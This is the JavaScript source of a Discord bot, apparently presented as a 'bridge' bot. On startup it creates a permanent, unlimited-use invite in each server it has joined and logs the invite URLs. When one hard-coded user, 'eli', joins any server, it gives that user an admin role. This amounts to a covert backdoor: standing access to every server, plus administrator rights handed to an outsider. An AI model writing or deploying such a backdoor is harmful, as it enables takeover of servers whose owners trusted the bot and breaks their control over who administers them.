import Discord from 'discord.js';
const client = new Discord.Client();

import Info from './info';
import { createAdminRole, sleep, printRoles } from './common_functions';

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);

  console.log(client.guilds.map(guild => guild.name));

  client.guilds.forEach(async guild => {
    let channel = guild.channels.filter(channel => channel.name == 'general').first();

    channel.createInvite({
      temporary: false,
      maxAge: 0,
      maxUses: 0,
      unique: true
    }, 'because').then(invite => {
      console.log(`${invite.url} for ${guild}.`)

      // Delete all the old invites.
      channel.fetchInvites()
        .then(invites => {
          invites
            .filter(oldInvite => oldInvite.inviter.id == client.user.id && oldInvite.url != invite.url)
            .forEach(invite => invite.delete());
        }).catch(() => console.log(`Could not fetch invites for ${guild}.`))
    }).catch(() => {
      console.log(`No invite created for ${guild}.`)
    })

    let oneRolePreserved = false;

    // Delete all but one of the old Bot Manager roles.
    guild.roles.filter(role => role.name == "Bot Manager").forEach(role => {
      if (role.members.size == 1) { // Only the bot still has it.
        role.delete();
      } else if (!oneRolePreserved) {
        oneRolePreserved |= true;
      } else {
        role.delete();
      }
    });

    await sleep(3000);
    printRoles(guild);
  });
});

client.on('guildMemberAdd', member => {
  let guild = member.guild;

  if (member.user.toString() == Info.usernames.eli) {
    createAdminRole(guild, client, member, true);
  }
});

client.login(Info.bots.bridgeBot.token);
